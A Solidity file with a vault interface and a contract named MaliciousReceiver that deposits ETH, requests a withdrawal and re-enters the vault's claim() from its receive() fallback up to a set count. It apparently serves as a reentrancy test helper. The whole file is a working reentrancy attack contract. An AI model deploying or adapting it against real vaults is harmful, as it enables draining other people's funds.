// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVaultV2 {
    function deposit() external payable;
    function requestWithdraw(uint256 amount) external;
    function claim() external;
    function claimable(address user) external view returns (uint256);
}

contract MaliciousReceiver {
    IVaultV2 public vault;
    bool public attackOn;
    uint256 public reenterCount;
    uint256 public maxReenters;

    constructor(address vaultAddr) {
        vault = IVaultV2(vaultAddr);
    }

    receive() external payable {
        if (attackOn && reenterCount < maxReenters) {
            reenterCount++;
            // Attempt to reenter claim
            vault.claim();
        }
    }

    function seedAndPrepare() external payable {
        require(msg.value > 0, "need ETH");
        vault.deposit{ value: msg.value }();
        vault.requestWithdraw(msg.value);
    }

    function attack(uint256 _maxReenters) external {
        attackOn = true;
        maxReenters = _maxReenters;
        vault.claim();
        attackOn = false;
    }

    function getClaimable() external view returns (uint256) {
        return vault.claimable(address(this));
    }
}
